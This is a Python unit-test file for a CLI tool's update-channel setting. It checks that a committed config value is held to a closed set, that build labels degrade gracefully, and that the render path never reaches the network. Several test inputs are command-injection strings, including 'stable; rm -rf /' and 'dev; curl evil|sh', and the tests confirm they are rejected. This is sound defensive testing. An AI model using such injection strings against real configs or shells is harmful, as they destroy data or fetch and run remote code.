"""The dev release channel: opting in, saying so, and what "newer" then means.

Three separate properties live here, and they fail in three different ways:

1. **`[update] channel` is a closed enum at the config boundary.** `charter.toml` is
   COMMITTED — it arrives from someone else's machine — and this value decides how charter
   installs itself. charter has already been bitten twice by a committed value reaching a
   parser (`[frame] hotkey` into tmux config text; a committed `mcp.json` key into YAML,
   #453). The tests below are written to fail if the closed set is ever relaxed into a
   sanitiser, and to fail if any operator-supplied string reaches an argv.
2. **A dev build can say it is one**, through PEP 610 `direct_url.json`, with every
   degradation handled — because the caller of last resort is `charter --version`, which
   must always print something.
3. **"Newer" changes meaning, and nothing else does.** Same cache, same TTL, same spawn
   cooldown, and above all still no network call on the status line's render path.

Nothing here touches the network. `urllib` is blocked outright in the render-path test
rather than merely unstubbed, so a future call added anywhere under `_brand()` fails
loudly instead of quietly reaching PyPI from a test run.
"""

from __future__ import annotations

import contextlib
import io
import json
import socket
import unittest
from unittest import mock

from charter import __version__, channel, config, instance, statusline, update
from tests._isolation import PersonaIso, child_plane_env, make_plane
from tests._planeguard import allow_background_checks


@contextlib.contextmanager
def build(doc):
    """Pretend this interpreter's install recorded *doc* as its PEP 610 direct_url.json.

    Patches the uncached reader AND clears the memo on both sides. The memo is what keeps
    a dist-info read off the status line's per-turn render path, and a test that patched
    only the reader would either see a previous test's answer or leave its own behind for
    the next one — a cross-test leak that reads as a flaky assertion about versions.
    """
    channel._reset_cache_for_tests()
    with mock.patch.object(channel, "_read_direct_url", return_value=doc):
        yield
    channel._reset_cache_for_tests()


def git_build(commit="abc1234def5678901234567890123456789abcde", ref="main"):
    info = {"vcs": "git", "commit_id": commit}
    if ref is not None:
        info["requested_revision"] = ref
    return {"url": "https://github.com/diazoxide/charter", "vcs_info": info}


class NetworkReached(BaseException):
    """Raised by :class:`NoNetwork` when the code under test tries to reach the network.

    **A `BaseException`, and that is the entire point of this class existing.**
    `update._fetch_head` and `_fetch_latest` both catch bare ``Exception`` — deliberately,
    because a failed background check must never break a render — and ``AssertionError``
    *is* an ``Exception``. The first version of this guard raised one, so every refusal was
    swallowed by the very code it was guarding: the guard reported green while the call
    happened. What actually reddened the mutation that added a live GET to the render path
    was a different test class making a REAL request to api.github.com, which means the
    invariant was pinned by network access rather than by the guard, and would have gone
    unpinned on an offline machine or a restricted runner.

    Nothing in charter catches ``BaseException``, so nothing can swallow this.
    """


class NoNetwork:
    """Mixin: for the length of every test in the class, the network refuses and records.

    Both halves are load-bearing. The **raise** is what fails a test loudly at the moment
    of the call. The **record** is what fails it even if some future ``except
    BaseException`` swallowed the raise — belt and braces on a guard whose whole history is
    a swallowed exception.

    Blocking the network itself rather than counting calls to one function is deliberate:
    a counter on `Path.stat` once missed an `open()`, a `subprocess.run` and the deletion
    of the very gate it claimed to pin. Every route out is patched — both socket
    constructors and both urllib entry points above them — so a call added anywhere under
    the code under test, through any library, is caught.

    `subprocess.Popen` is NOT blocked: the detached refresh is not a violation of the rule,
    it is the mechanism that keeps it. Tests that care stub it themselves.
    """

    _ROUTES = ("socket.socket", "socket.create_connection",
               "urllib.request.urlopen", "urllib.request.urlretrieve")

    def setUp(self):
        super().setUp()
        #: Every network call ATTEMPTED, recorded before the refusal is raised.
        self.requested: list[str] = []
        for route in self._ROUTES:
            self.enterContext(mock.patch(route, self._refuse(route)))
        # Automatic, so a test added to one of these classes later is covered without
        # anybody remembering to assert it. A test that legitimately provokes the block
        # clears the list itself.
        self.addCleanup(self._assert_quiet)

    def _refuse(self, route):
        def boom(*a, **kw):
            self.requested.append(f"{route}({a[0] if a else ''})")
            raise NetworkReached(route)
        return boom

    def _assert_quiet(self):
        self.assertEqual(self.requested, [],
                         "the code under test reached the network")


class TheChannelIsAClosedSet(unittest.TestCase):
    """`instance.update_of` is the whole boundary. Everything downstream compares."""

    def test_an_absent_section_is_the_stable_channel(self):
        self.assertEqual(instance.update_of({}), {"channel": "stable"})

    def test_the_declared_dev_channel_is_honoured(self):
        self.assertEqual(instance.update_of({"update": {"channel": "dev"}})["channel"], "dev")

    def test_the_value_returned_is_charters_own_constant_not_the_files_string(self):
        """The guarantee is structural, not a promise about `tomllib`'s output.

        A caller that receives the very object a committed file supplied is a caller that
        could be the place a subclass with a surprising `__str__`, or a value carrying
        anything at all, gets interpolated. Identity — not equality — is what says the
        object crossing this boundary is one of the two charter wrote itself.

        Fails if `update_of` is ever "simplified" to `out[key] = value` after checking
        membership, which passes every equality assertion in this class.
        """
        supplied = "".join(["d", "e", "v"])          # equal to "dev", not the same object
        self.assertIsNot(supplied, instance.UPDATE_CHANNELS[1])
        got = instance.update_of({"update": {"channel": supplied}})["channel"]
        self.assertIs(got, instance.UPDATE_CHANNELS[1])

    def test_every_way_of_getting_it_wrong_lands_on_stable(self):
        """One direction only, and it is the conservative one: stable installs a published
        release, dev installs whatever `main` says this minute.

        The newline payload is the `[frame] hotkey` incident's exact shape — a value that
        ends one line and starts another. It is here because that is how the last one got
        in, not because a newline is special: the point is that NO string survives.
        """
        for value in ("Dev", "DEV", " dev", "dev ", "dev\nrun-shell 'touch /tmp/PWNED'",
                      "stable; rm -rf /", "", "latest", "main", "git+https://evil/x@main",
                      "../../etc", 1, 0, True, False, None, ["dev"], {"channel": "dev"},
                      3.5):
            with self.subTest(value=value):
                got = instance.update_of({"update": {"channel": value}})
                self.assertEqual(got["channel"], "stable")

    def test_a_section_that_is_not_a_section_degrades_rather_than_raising(self):
        """`instance` is imported by every command including `charter --version`, so a
        hand-edited charter.toml must never crash import."""
        for section in ("dev", ["dev"], 7, None, True):
            with self.subTest(section=section):
                self.assertEqual(instance.update_of({"update": section})["channel"], "stable")

    def test_the_defaults_view_and_the_fields_table_cannot_drift(self):
        """The `FRAME_FIELDS` shape's whole reason for existing: one structure, so a key
        added to a defaults dict and forgotten in a spellings dict is impossible."""
        self.assertEqual(set(instance.UPDATE_DEFAULTS), set(instance.UPDATE_FIELDS))
        self.assertEqual(instance.UPDATE_DEFAULTS["channel"], "stable")
        self.assertEqual(instance.UPDATE_FIELDS["channel"][1], "channel")

    def test_stable_is_the_first_channel_and_dev_the_second(self):
        """`UPDATE_CHANNELS[0]` is the default and the fallback; the order is load-bearing
        for the identity assertion above, which names `[1]`."""
        self.assertEqual(instance.UPDATE_CHANNELS, ("stable", "dev"))


class TheChannelReachesConfig(PersonaIso):
    """`config.UPDATE` is derived from the plane's own charter.toml, like `config.FRAME`."""

    def _declare(self, text: str) -> None:
        (self.tmp / "charter.toml").write_text(text)
        config.use(self.tmp)

    def test_a_plane_that_declares_dev_derives_dev(self):
        self._declare('schema = 1\n[update]\nchannel = "dev"\n')
        self.assertEqual(config.UPDATE, {"channel": "dev"})
        self.assertTrue(channel.is_dev())

    def test_a_plane_that_declares_nothing_is_stable(self):
        self._declare("schema = 1\n")
        self.assertEqual(config.UPDATE, {"channel": "stable"})
        self.assertFalse(channel.is_dev())

    def test_a_hostile_declaration_is_stable_and_the_cli_still_runs(self):
        self._declare('schema = 1\n[update]\nchannel = "dev\\nrun-shell x"\n')
        self.assertEqual(config.UPDATE, {"channel": "stable"})
        self.assertFalse(channel.is_dev())

    def test_update_is_one_of_the_settings_the_test_harness_isolates(self):
        """`config.DERIVED` is the source of truth for what `config.use` swaps, and the
        reason `tests/_isolation.py` asks it rather than copying a list: four settings once
        went missing from a hand-copied harness and the suite wrote into a developer's real
        `.charter/`. A setting absent from `DERIVED` is a setting a test cannot isolate."""
        self.assertIn("UPDATE", config.DERIVED)


class TheChannelIsRematchedInProcess(unittest.TestCase):
    """`config.UPDATE` is a module attribute; anything in-process can assign it.

    `channel.channel()` re-matches against the closed set rather than trusting what it
    finds there, so the two-constant guarantee holds for every reader of `channel()` and
    not only for planes whose value happened to come through `update_of`.
    """

    def test_a_hostile_value_planted_on_config_still_reads_as_stable(self):
        with mock.patch.object(config, "UPDATE", {"channel": "dev; curl evil|sh"}):
            self.assertEqual(channel.channel(), "stable")
            self.assertFalse(channel.is_dev())

    def test_a_missing_or_malformed_config_attribute_reads_as_stable(self):
        for planted in (None, "dev", ["dev"], {}, {"channel": None}):
            with self.subTest(planted=planted):
                with mock.patch.object(config, "UPDATE", planted):
                    self.assertEqual(channel.channel(), "stable")

    def test_a_declared_dev_value_is_honoured(self):
        with mock.patch.object(config, "UPDATE", {"channel": "dev"}):
            self.assertTrue(channel.is_dev())


class TheBuildSaysWhatItIs(unittest.TestCase):
    """PEP 610: a VCS install writes `direct_url.json`, a PyPI install writes none at all.

    The ABSENCE is the positive statement "this came from PyPI", which is what lets charter
    identify a dev build without stamping anything at build time — and it must be, because
    dev builds are never published: PyPI forbids local version identifiers, so a real dev
    release would burn `0.52.0.dev1`, `.dev2`, … permanently and irreversibly.
    """

    def test_no_direct_url_is_a_pypi_install_and_prints_the_bare_version(self):
        with build(None):
            self.assertEqual(channel.build_label(), __version__)
            self.assertIsNone(channel.installed_commit())

    def test_a_git_install_names_the_ref_and_the_short_commit(self):
        with build(git_build()):
            self.assertEqual(channel.build_label(), f"{__version__}+dev (main @ abc1234)")
            self.assertEqual(channel.installed_ref(), "main")
            self.assertTrue(channel.installed_commit().startswith("abc1234"))

    def test_a_git_install_with_no_requested_revision_drops_the_ref(self):
        """`requested_revision` is optional in PEP 610 — `pip install git+…` with no `@ref`
        records only the commit. Printing `main` there would be a guess printed as a fact."""
        with build(git_build(ref=None)):
            self.assertEqual(channel.build_label(), f"{__version__}+dev (abc1234)")
            self.assertIsNone(channel.installed_ref())

    def test_a_vcs_record_with_no_commit_still_reads_as_a_dev_build(self):
        doc = {"url": "https://github.com/diazoxide/charter",
               "vcs_info": {"vcs": "git", "requested_revision": "main"}}
        with build(doc):
            self.assertEqual(channel.build_label(), f"{__version__}+dev")
            self.assertIsNone(channel.installed_commit())

    def test_a_non_git_direct_url_is_local_rather_than_dev_or_pypi(self):
        """`uv tool install .` from a checkout, or a wheel installed by path. Not from
        PyPI, so plain `0.51.0` would claim a provenance it does not have; no commit
        either, so `+dev (…)` would be a name for something with no name."""
        with build({"url": "file:///tmp/charter", "dir_info": {}}):
            self.assertEqual(channel.build_label(), f"{__version__}+local")
            self.assertIsNone(channel.installed_commit())

    def test_a_non_git_vcs_is_not_treated_as_git(self):
        with build({"url": "hg+https://x/y", "vcs_info": {"vcs": "hg", "commit_id": "1"}}):
            self.assertEqual(channel.build_label(), f"{__version__}+local")
            self.assertIsNone(channel.installed_commit())

    def test_every_malformed_record_degrades_and_none_of_them_raise(self):
        """`--version` must always print something. Each of these is a state that happens:
        a half-written dist-info, a hand-edited one, JSON that is not an object."""
        for doc in (None, {}, {"url": "x"}, {"vcs_info": "git"}, {"vcs_info": []},
                    {"vcs_info": {"vcs": "git", "commit_id": 7}},
                    {"vcs_info": {"vcs": "git", "commit_id": "   "}}):
            with self.subTest(doc=doc):
                with build(doc):
                    self.assertIn(__version__, channel.build_label())

    def test_an_unreadable_dist_info_is_none_rather_than_an_exception(self):
        """The real reader, not the stub: `Distribution.from_name` raises
        `PackageNotFoundError` when running from a checkout with nothing installed, and
        raises other things when a dist-info is half-written."""
        channel._reset_cache_for_tests()
        self.addCleanup(channel._reset_cache_for_tests)
        with mock.patch("importlib.metadata.Distribution.from_name",
                        side_effect=RuntimeError("torn dist-info")):
            self.assertIsNone(channel._read_direct_url())

    def test_non_json_content_is_none_rather_than_an_exception(self):
        channel._reset_cache_for_tests()
        self.addCleanup(channel._reset_cache_for_tests)
        for raw in ("", "not json", "[1,2]", "null", "7"):
            with self.subTest(raw=raw):
                dist = mock.Mock()
                dist.read_text.return_value = raw
                with mock.patch("importlib.metadata.Distribution.from_name",
                                return_value=dist):
                    self.assertIsNone(channel._read_direct_url())

    def test_the_dist_info_is_read_once_per_process(self):
        """The memo is not an optimisation to be tidied away: `build_label` and
        `installed_commit` are both reachable from the status line, which renders every
        turn, and the answer cannot change inside one process — an install replaces the
        interpreter's own package."""
        channel._reset_cache_for_tests()
        self.addCleanup(channel._reset_cache_for_tests)
        with mock.patch.object(channel, "_read_direct_url",
                               return_value=git_build()) as reader:
            for _ in range(5):
                channel.build_label()
                channel.installed_commit()
                channel.installed_ref()
            self.assertEqual(reader.call_count, 1)


class VersionAlwaysPrints(unittest.TestCase):
    def test_the_cli_prints_a_version_line(self):
        """A REAL child, in a THROWAWAY plane.

        The child is a separate process: nothing this suite patches reaches it, and it
        resolves its own plane. Run bare, it resolved the developer's — and `--version`
        prints the build label, which on a dev-channel plane says something different, so
        this case's outcome depended on the operator's own `charter.toml` in a way
        `_planeguard`'s `RealPlaneRead` cannot see across a fork (#459, #527).

        `PYTHONPATH` because the cwd is no longer the checkout: `-m` would otherwise have
        nothing to import.
        """
        import subprocess
        import sys
        from pathlib import Path

        plane, env = child_plane_env(
            self, PYTHONPATH=str(Path(__file__).resolve().parents[1]))
        p = subprocess.run([sys.executable, "-m", "charter", "--version"],
                           cwd=plane, env=env, capture_output=True, text=True)
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertIn("charter", p.stdout)
        self.assertIn(__version__, p.stdout)

    def test_building_the_parser_does_not_read_the_dist_info(self):
        """`--version` is a lazy argparse action, and this is the only thing pinning it.

        `build_parser()` runs on EVERY charter invocation — every hook, every status line
        render, several per turn. argparse's own `action="version"` takes a FINISHED string
        at `add_argument` time, so resolving the build label there would put a dist-info
        read on several hundred paths to serve one. Three separate docstrings claim this
        laziness; nothing measured it, so reverting to `action="version"` was free.
        """
        from charter import cli
        channel._reset_cache_for_tests()
        self.addCleanup(channel._reset_cache_for_tests)
        with mock.patch.object(channel, "_read_direct_url",
                               return_value=git_build()) as reader:
            cli.build_parser()
        self.assertEqual(reader.call_count, 0,
                         "building the parser read the dist-info — --version is not lazy")

    def test_asking_for_the_version_does_read_it(self):
        """The other half: lazy must not mean never. Without this, deleting the read
        altogether would satisfy the test above."""
        from charter import cli
        parser = cli.build_parser()
        channel._reset_cache_for_tests()
        self.addCleanup(channel._reset_cache_for_tests)
        out = io.StringIO()
        with mock.patch.object(channel, "_read_direct_url",
                               return_value=git_build()) as reader, \
                contextlib.redirect_stdout(out):
            with self.assertRaises(SystemExit) as exit_code:
                parser.parse_args(["--version"])
        self.assertEqual(exit_code.exception.code, 0)
        self.assertEqual(reader.call_count, 1)
        self.assertIn("+dev (main @ abc1234)", out.getvalue())

    def test_a_stable_install_still_prints_exactly_one_word_after_the_name(self):
        """`commands_update._handoff` verifies an install by comparing `charter
        --version`'s LAST WORD to the version it asked for. A suffix on the stable path
        would break every stable update, silently, at the verification step."""
        with build(None):
            self.assertEqual(f"charter {channel.build_label()}".split()[-1], __version__)



class TheRenderPathNeverReachesTheNetwork(NoNetwork, PersonaIso):
    """The rule `charter.update`'s module docstring opens with, enforced rather than read.

    `NoNetwork` supplies the block and the automatic "nothing was requested" assertion; see
    that class and :class:`NetworkReached` for why the refusal is a `BaseException`, which
    is the difference between this guard working and this guard being decorative.

    `subprocess.Popen` is stubbed here rather than blocked: the detached refresh is not a
    violation of the rule, it is the mechanism that keeps it. What the stub pins is that
    the refresh is the ONLY way out, and that it is never waited on.
    """

    def _render_brand(self, cache: dict, cfg: dict, doc):
        p = update._cache_file()
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(cache))
        spawned = []
        with contextlib.ExitStack() as stack:
            stack.enter_context(mock.patch.object(
                update.subprocess, "Popen",
                side_effect=lambda *a, **kw: spawned.append(a) or mock.Mock()))
            stack.enter_context(mock.patch.object(config, "UPDATE", cfg))
            stack.enter_context(build(doc))
            out = statusline._brand()
        return out, spawned


    def test_a_render_survives_a_cache_file_that_is_not_json(self):
        p = update._cache_file()
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text("{{{ not json")
        with mock.patch.object(config, "UPDATE", {"channel": "dev"}), \
                mock.patch.object(update, "maybe_spawn", lambda: None), build(None):
            self.assertIn(__version__, statusline._brand())



class TheBlockItselfIsNotDecorative(NoNetwork, unittest.TestCase):
    """A positive control on :class:`NoNetwork`. Without one, a guard that stopped guarding
    reads exactly like a guard that has nothing to catch — which is what happened.

    Every test here provokes the block deliberately and clears the record afterwards, so
    the mixin's automatic "nothing was requested" cleanup does not fire on them.
    """

    def test_urlopen_is_refused_and_recorded(self):
        import urllib.request
        with self.assertRaises(NetworkReached):
            urllib.request.urlopen("https://example.invalid/never")
        self.assertTrue(self.requested)
        self.requested.clear()

    def test_an_except_exception_handler_cannot_swallow_the_refusal(self):
        """The shape of `update._fetch_head`'s own guard, spelled out.

        This is the assertion that would have failed on the first version of this block,
        which raised `AssertionError`. `except Exception` caught it, `_fetch_head` returned
        `None`, and the render-path class went green over a live GET.
        """
        import urllib.request
        swallowed = True
        try:
            urllib.request.urlopen("https://example.invalid/never")
        except Exception:                      # noqa: BLE001 — the point of the test
            swallowed = True
        except NetworkReached:
            swallowed = False
        self.assertFalse(swallowed, "`except Exception` swallowed the block — it is inert")
        self.requested.clear()

    def test_the_socket_constructors_are_refused_too(self):
        """urllib is not the only way out. `http.client`, `ssl` and anything vendored
        underneath them all end at a socket."""
        for call in (lambda: socket.socket(), lambda: socket.create_connection(("x", 1))):
            with self.assertRaises(NetworkReached):
                call()
        self.assertEqual(len(self.requested), 2)
        self.requested.clear()

    def test_the_recorder_runs_before_the_raise(self):
        """The belt half of belt and braces: if some future `except BaseException` did
        swallow the refusal, the recorded list is what still fails the test."""
        import urllib.request
        try:
            urllib.request.urlopen("https://example.invalid/never")
        except BaseException:                  # noqa: BLE001 — simulating the bad catcher
            pass
        self.assertEqual(len(self.requested), 1)
        self.requested.clear()


if __name__ == "__main__":
    unittest.main()
